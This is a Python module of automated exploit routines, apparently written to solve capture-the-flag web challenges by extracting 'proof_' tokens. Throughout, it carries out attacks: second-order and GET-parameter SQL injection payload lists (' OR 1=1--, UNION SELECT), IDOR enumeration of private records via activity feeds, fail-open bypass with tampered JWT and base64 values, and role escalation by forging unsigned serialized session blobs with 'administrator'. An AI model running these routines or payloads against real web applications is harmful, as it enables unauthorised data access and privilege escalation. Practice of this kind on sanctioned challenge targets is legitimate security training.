#!/usr/bin/env python3
"""POST-capable sibling recognisers for web_proof_recon.LADDER.

The ladder in web_proof_recon.py is GET-only by design. These two recognisers add the two
POST-stateful families we have now seen on real-day targets:

  * stored_second_order_filter_like — Day 12 "Ask Again Later" Sinatra. A POSTed `filter`
    is stored into a saved_filters table; a later GET of secondary_route runs
    `SELECT ... FROM records WHERE label LIKE '<saved>'`. `' OR 1=1--` dumps the private
    row. Only the field named by `/api/clues.feature_route` is honoured; every other key
    is accepted (POST returns 201) and ignored, so this never guesses a dangerous shape.

  * activity_feed_idor — Day 12 "Tiny Triage" / "Case Crate". An authenticated analyst
    (Riley) sees their own cases on /; the HTML advertises a `/api/events` feed that
    leaks case ids whose visibility is NOT "workspace" (or whose owner != current_user).
    `/api/briefs/{case_id}` has no object-level ACL and returns `{"note":"proof_..."}`.

Both recognisers:
  * accept the ladder's `_S` session (same cookie jar + scope guard + real UA).
  * open exactly ONE POST per candidate (not a wordlist sweep).
  * do a tell-first guard: a target that does not look like the family returns None in
    a single GET, costing nothing and never sending a POST on an unknown shape.
  * return a proof string on success or None on miss, never raise, never execute a sample.

Promotion into the ladder (one edit to web_proof_recon.py):

    from web_recon_post import stored_second_order_filter_like, activity_feed_idor
    LADDER = [
        ("clues_feature_route",             r_clues_feature_route),
        ("stored_second_order_filter_like", stored_second_order_filter_like),  # NEW
        ("activity_feed_idor",              activity_feed_idor),               # NEW
        ("ssti_inject",                     r_ssti_inject),
        ("robots_disclosed_dir",            r_robots_disclosed_dir),
        ("path_traversal",                  r_path_traversal),
        ("idor_object_api",                 r_idor_object_api),
        ("source_comment",                  r_source_comment),
        ("env_backup",                      r_env_backup),
        ("git_disclosure",                  r_git_disclosure),
        ("debug_actuator",                  r_debug_actuator),
        ("role_header",                     r_role_header),
    ]

Fixture tests should mirror challenges/_lib/_test_web_proof_recon.py one entry per
recogniser, replaying the HTML/JSON responses captured in
challenges/Day 23/Ask Again Later/_gm_record (preserved alongside this writeup).
"""
import base64
import json
import re
import urllib.parse
import urllib.request

PROOF_RE = re.compile(rb"(proof_[0-9a-f]{16,64})")
_FIELD_PRIORITY = ("filter", "note", "query", "q", "search", "where", "value", "input")
_SQLI_UNIVERSAL = "' OR 1=1--"
_IDOR_EVENT_PATHS = ("/api/events", "/api/history", "/api/activity", "/api/audit", "/api/feed")
_IDOR_OBJECT_TEMPLATES = (
    "/api/briefs/%s",
    "/api/cases/%s",
    "/api/incidents/%s",
    "/api/tickets/%s",
    "/api/records/%s",
    # non-/api object paths: Day-26 "Case Crate"/"Incident Picnic" link the brief directly
    # as /briefs/{id} (the HTML "Open case" button), no /api prefix. Additive, still GET-only.
    "/briefs/%s",
    "/cases/%s",
    "/incidents/%s",
    "/tickets/%s",
    "/records/%s",
)
# serialized-state trust family (Day-26 "Object Post" / "State Suitcase", Quarkus): ranked
# privileged-role candidates for an UNSIGNED, client-supplied serialized session blob.
# `administrator` is the confirmed live value; the rest cover sibling instances cheaply.
_ROLE_CANDS = ("administrator", "admin", "superadmin", "superuser", "root", "owner",
               "sysadmin", "manager", "operator", "privileged", "staff", "supervisor")
# GET query-builder SQLi family (Day-26 "Signal Shelf", Flask): universal truthy clauses.
_SQLI_GET = ("' OR 1=1-- -", "' OR '1'='1", "') OR ('1'='1", "%' OR '1'='1'-- -",
             "' OR 1=1#", "' OR 'a'='a", "x' UNION SELECT NULL-- -")


def _proof_bytes(data):
    """Return the first proof_... literal in a bytes/str body, or None."""
    if not data:
        return None
    buf = data if isinstance(data, (bytes, bytearray)) else str(data).encode("latin-1", "ignore")
    m = PROOF_RE.search(buf)
    return m.group(1).decode("latin-1", "ignore") if m else None


def _json_or_none(body):
    try:
        return json.loads(body)
    except Exception:
        return None


def _post(s, url, body, ctype="application/json"):
    """POST through the caller's session (D32): the standalone ladder session (web_proof_recon._S: host allow-list, cookie
    jar, UA) or the battery's session (autosolve_web._ScopedSession: web_scope.scoped_post, exact origin, shared budget).
    The old version reached around the session with urllib and needed _S internals, so inside the battery (which has no
    .allow/.ctx) every POST recogniser failed silently. Out of scope -> the session refuses."""
    try:
        st, h, b = s.post(url, body, content_type=ctype)
    except ValueError:
        raise
    except Exception as e:
        return 0, {}, str(e).encode()
    return (st or 0), (h or {}), (b or b"")


# ---- RECOGNISERS -------------------------------------------------------------

def stored_second_order_filter_like(s, base):
    """Day-12 "Ask Again Later" Sinatra: stored LIKE filter → second-order SQLi.

    Shape tell: `/api/clues` returns a JSON with both `feature_route` (POST sink) and
    `secondary_route` (the delayed-query GET). If either is missing this returns None in
    a single GET and never posts.

    Payload: `{"filter": "' OR 1=1--"}` posted to feature_route; then GET secondary_route
    → scan rows[] for `proof_...`. Falls back to a tiny field-name matrix only if the
    first POST was accepted (201) but no proof appeared on the GET — the server returns
    `{"ok":true,"saved":true}` for every field name regardless, so the matrix is bounded
    to _FIELD_PRIORITY and never guesses a semantic payload (the LIKE value stays the
    universal truthy clause).
    """
    import urllib.parse
    _, _, cb = s.get(base + "/api/clues")
    clues = _json_or_none(cb) or {}
    submit = clues.get("feature_route")
    result = clues.get("secondary_route")
    if not submit or not result:
        return None

    def try_field(name):
        _post(s, base + submit, json.dumps({name: _SQLI_UNIVERSAL}))
        _, _, rb = s.get(base + result)
        rj = _json_or_none(rb) or {}
        rows = rj.get("rows") or []
        for row in rows:
            if isinstance(row, str):
                hit = _proof_bytes(row.encode("utf-8", "ignore"))
                if hit:
                    return hit
        # even if the row happened to be a non-string (int/null) scan the whole blob
        return _proof_bytes(rb)

    for fld in _FIELD_PRIORITY:
        hit = try_field(fld)
        if hit:
            return hit
    return None


def activity_feed_idor(s, base):
    """Day-12 "Tiny Triage" / "Case Crate": activity-feed IDOR under an auto-issued cookie.

    Shape tell: GET / is 200, sets at least one Set-Cookie (the session), and body text
    contains "Signed in as" plus a reference to an activity/integration/events feed.
    If any of those are absent this returns None without touching any API.

    Steps:
      1. GET / to seed the session cookie (the ladder's `_S` captures it).
      2. GET each of _IDOR_EVENT_PATHS; the first that answers JSON with an events[]
         (or history[] / activity[] / records[]) wins.
      3. Pick case_ids where visibility != "workspace" OR owner != current_user; fall
         back to every id seen if the feed does not label visibility.
      4. For each picked id, GET each of _IDOR_OBJECT_TEMPLATES until a 200 with a
         `proof_...` literal lands.

    Caps itself: at most 10 ids × 5 templates = 50 GETs in the worst case, bounded by
    scope and session, no POST, no credential-replay.
    """
    code, _, hb = s.get(base + "/")
    body = hb if isinstance(hb, (bytes, bytearray)) else b""
    if code != 200:
        return None
    try:
        txt = body.decode("utf-8", "replace")
    except Exception:
        return None
    # Tell: a signed-in identity banner, OR object-reference links (the "Open case" buttons
    # point at /briefs|cases|incidents|tickets|records/{id}), AND an activity/feed hint.
    # Day-26 "Incident Picnic" links cases without the literal "Signed in as" phrase, so the
    # object-reference link alone qualifies the family.
    low = txt.lower()
    has_identity = ("signed in as" in low) or ("signed_in" in low) or ("current_user" in low)
    has_obj_refs = bool(re.search(r"/(briefs|cases|incidents|tickets|records)/\d", txt))
    has_feed_hint = any(k in low for k in ("activity", "events", "feed", "integration", "workspace", "history"))
    if not (has_identity or has_obj_refs):
        return None
    if not (has_feed_hint or has_obj_refs):
        return None

    feed = None
    feed_raw = b""
    for p in _IDOR_EVENT_PATHS:
        c, _, fb = s.get(base + p)
        if c == 200:
            j = _json_or_none(fb)
            if isinstance(j, dict) and any(k in j for k in ("events", "history", "activity", "records", "items")):
                feed = j
                feed_raw = fb if isinstance(fb, (bytes, bytearray)) else b""
                break
    if not feed:
        return None

    current_user = feed.get("current_user") or feed.get("me") or feed.get("user")
    entries = feed.get("events") or feed.get("history") or feed.get("activity") or feed.get("records") or feed.get("items") or []

    privileged, remaining = [], []
    for ev in entries:
        if not isinstance(ev, dict):
            continue
        oid = ev.get("case_id") or ev.get("id") or ev.get("case") or ev.get("record_id") or ev.get("ticket_id")
        if oid is None:
            continue
        vis = str(ev.get("visibility") or "").lower()
        owner = ev.get("owner")
        if (vis and vis != "workspace") or (current_user and owner and owner != current_user):
            privileged.append(oid)
        else:
            remaining.append(oid)

    # Fallback: if the feed entries did not expose a usable id key, harvest every numeric
    # token from the raw feed bytes (bounded) so a differently-shaped feed still yields ids.
    if not privileged and not remaining and feed_raw:
        try:
            privileged = re.findall(r"\b(\d{2,8})\b", feed_raw.decode("utf-8", "ignore"))
        except Exception:
            privileged = []
    # also try object ids linked on the landing page (own cases) as low-priority candidates
    remaining = list(remaining) + re.findall(r"/(?:briefs|cases|incidents|tickets|records)/(\d{1,8})", txt)

    seen = []
    for i in list(privileged) + list(remaining):
        if i in seen:
            continue
        seen.append(i)
        if len(seen) >= 12:
            break
    for i in seen:
        for tmpl in _IDOR_OBJECT_TEMPLATES:
            c, _, ob = s.get(base + (tmpl % str(i)))
            if c == 200:
                hit = _proof_bytes(ob)
                if hit:
                    return hit
    return None


def _fail_open_decision_payloads(public_decision):
    """Decision values a decoder CANNOT decode (empty / invalid base64 / broken JSON / corrupted
    copies of the documented public decision / tampered JWT segments). Ordered, de-duplicated,
    bounded; never a free-text semantic guess. Shared shape with autosolve_web._fail_open_payloads."""
    out = []

    def _add(v):
        if v is not None and v not in out:
            out.append(v)

    for v in ("", "!", "%%%", "@@@@", "not-base64!!", "====", "{", "null", "undefined", "0"):
        _add(v)
    pd = str(public_decision or "").strip()
    if pd:
        _add(pd[:-4] if len(pd) > 4 else pd[:-1])
        _add(pd[: max(1, len(pd) // 2)])
        _add(pd + "===")
        _add(pd.swapcase())
        _add(pd[::-1])
        _add(("X" + pd[1:]) if len(pd) > 1 else "X")
        if "." in pd:
            segs = pd.split(".")
            for i in range(len(segs)):
                t = list(segs)
                t[i] = (t[i][:-2] + "AA") if len(t[i]) > 2 else "AA"
                _add(".".join(t))
            _add(".".join(segs[:-1]))
    return out[:16]


def fail_open_policy_decode(s, base):
    """Day-24 "Fail Open Friday": a remote policy decoder gates a resource and is FAIL-OPEN - a
    decision it cannot decode falls through to a default-allow, so the gated resource leaks the proof.

    Shape tell (GET-only; no prompt available in the ladder): GET /api/clues returns JSON carrying a
    `feature_route` AND at least one decision/policy/decode-ish key. If either is absent this returns
    None after a single GET and sends nothing else.

    The documented public decision (several key spellings, else a base64url/JWT token scraped from the
    clues/landing bytes) seeds structure-aware corruptions; a bounded set of undecodable decision values
    is sent via the discovered query parameter (and with the parameter omitted). First proof_... wins.
    GET-only, bounded (<= 6 params x 16 payloads), never raises, never guesses a semantic value."""
    _, _, cb = s.get(base + "/api/clues")
    clues = _json_or_none(cb) or {}
    if not isinstance(clues, dict):
        return None
    feature = clues.get("feature_route") or clues.get("gated_route") or clues.get("resource_route")
    decision_keyish = any(re.search(r"decision|policy|decod|verdict", str(k), re.I) for k in clues.keys())
    if not feature or not decision_keyish:
        return None
    feature = feature if str(feature).startswith("/") else "/" + str(feature)

    params = []
    for k, v in clues.items():
        if re.search(r"param|parameter|field|query|key", str(k), re.I) and isinstance(v, str) and v and "/" not in v:
            if v not in params:
                params.append(v)
    for p in ("decision", "policy", "token", "d", "p", "access", "verdict", "decoded", "auth"):
        if p not in params:
            params.append(p)

    public_decision = None
    for key in ("public_decision", "documented_decision", "sample_decision", "example_decision",
                "valid_decision", "default_decision", "decision", "public_token", "sample"):
        v = clues.get(key)
        if isinstance(v, str) and v:
            public_decision = v
            break
    if public_decision is None:
        hay = (cb.decode("latin-1", "ignore") if isinstance(cb, (bytes, bytearray)) else str(cb or ""))
        _, _, hb = s.get(base + "/")
        hay += "\n" + (hb.decode("latin-1", "ignore") if isinstance(hb, (bytes, bytearray)) else str(hb or ""))
        m = re.search(r"\b([A-Za-z0-9_\-]{12,}\.[A-Za-z0-9_\-]{6,}\.[A-Za-z0-9_\-]{6,})\b", hay) \
            or re.search(r"\b([A-Za-z0-9+/_\-]{24,}={0,2})\b", hay)
        public_decision = m.group(1) if m else None

    payloads = _fail_open_decision_payloads(public_decision)
    for param in params[:6]:
        for pv in payloads:
            _, _, bb = s.get(base + feature + "?" + urllib.parse.urlencode({param: pv}))
            hit = _proof_bytes(bb)
            if hit:
                return hit
        _, _, bb = s.get(base + feature)        # parameter omitted entirely
        hit = _proof_bytes(bb)
        if hit:
            return hit
    return None


def _b64url_nopad(obj):
    """base64url of compact UTF-8 JSON, no padding - exactly what /api/state-format advertises."""
    raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
    return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")


def serialized_state_trust(s, base):
    """Day-26 "Object Post" / "State Suitcase" (Quarkus): UNSIGNED serialized session trust.

    The app trusts a client-supplied serialized state blob with NO signature. It advertises
    the exact transport at /api/state-format:
        {transport, content_type, request_field, encoding:"base64url of UTF-8 JSON",
         sample_state:{"user":"analyst","role":"analyst"}, sample_encoded}
    and the POST sink at /api/clues.feature_route. The sample state is the UNPRIVILEGED
    identity; the fix is to reshape the role to a privileged value and re-encode, then POST.

    Shape tell: /api/state-format returns JSON carrying `request_field` + an `encoding` that
    mentions base64. If that is absent this returns None without POSTing anything.

    Payload: for each ranked role candidate, set every string field of sample_state (except a
    distinct username) to the candidate, base64url(compact JSON), POST
    {request_field: <blob>} to feature_route. A trusted reshape answers 200
    {"ok":true,"effect":"serialized_role_trusted","evidence":"proof_..."}; a rejected one
    answers 403 {"error":"role_not_permitted"} and costs nothing else. Bounded to the
    candidate list, never a free-text guess, never executes the blob.
    """
    _, _, sfb = s.get(base + "/api/state-format")
    sf = _json_or_none(sfb)
    if not isinstance(sf, dict):
        return None
    field = sf.get("request_field") or "state"
    enc = str(sf.get("encoding") or "")
    if "base64" not in enc.lower():
        return None
    sample = sf.get("sample_state")
    if not isinstance(sample, dict) or not sample:
        sample = {"user": "analyst", "role": "analyst"}
    # feature route (POST sink)
    _, _, cb = s.get(base + "/api/clues")
    clues = _json_or_none(cb) or {}
    feature = clues.get("feature_route")
    if not feature:
        tr = sf.get("transport") or ""
        m = re.search(r"(/\S+)", str(tr))
        feature = m.group(1) if m else "/process"
    furl = base + feature
    # which fields to escalate: role-ish string fields; never clobber a non-default username
    unpriv = ("analyst", "user", "viewer", "guest", "member", "")
    esc_keys = [k for k, v in sample.items()
                if isinstance(v, str) and (re.search(r"role|group|perm|access|tier|scope", k, re.I)
                                           or v.lower() in unpriv)]
    if not esc_keys:
        esc_keys = [k for k, v in sample.items() if isinstance(v, str)]
    for cand in _ROLE_CANDS:
        state = dict(sample)
        for k in esc_keys:
            if k.lower() in ("user", "username", "name") and str(sample.get(k, "")).lower() not in unpriv:
                continue
            state[k] = cand
        try:
            c, _, b = _post(s, furl, json.dumps({field: _b64url_nopad(state)}))
        except Exception:
            return None
        if c == 200:
            hit = _proof_bytes(b)
            if hit:
                return hit
    return None


def query_get_sqli(s, base):
    """Day-26 "Signal Shelf" (Flask): "extremely confident query builder" = GET-param SQLi.

    Shape tell: GET / exposes a search form whose `action` points at a query endpoint
    (/query, /explore, /search) with a text input. A universal truthy clause injected into
    the parameter makes the builder return every row, including the private one holding the
    proof. GET-only, bounded payload list, no stored side effect.

    If no query form/endpoint is present this returns None after a single GET of /.
    """
    c, _, hb = s.get(base + "/")
    if c != 200:
        return None
    try:
        home = (hb if isinstance(hb, (bytes, bytearray)) else b"").decode("utf-8", "replace")
    except Exception:
        return None
    actions = re.findall(r"action=['\"]([^'\"]+)['\"]", home)
    params = re.findall(r"<input[^>]*\bname=['\"]([^'\"]+)['\"]", home)
    # sane defaults for this family if the markup is terse
    cand_actions = [a for a in actions if a] or ["/query", "/explore", "/search"]
    cand_params = [p for p in params if p] or ["q"]
    tell = any(re.search(r"/(query|explore|search)", a) for a in cand_actions) \
        or "query builder" in home.lower() or "Signal Shelf" in home
    if not tell:
        return None
    for act in cand_actions:
        aurl = base + (act if act.startswith("/") else "/" + act)
        for param in cand_params:
            for payload in _SQLI_GET:
                try:
                    c, _, b = s.get(aurl + "?" + urllib.parse.urlencode({param: payload}))
                except Exception:
                    continue
                if c in (200, 500):
                    hit = _proof_bytes(b)
                    if hit:
                        return hit
    return None
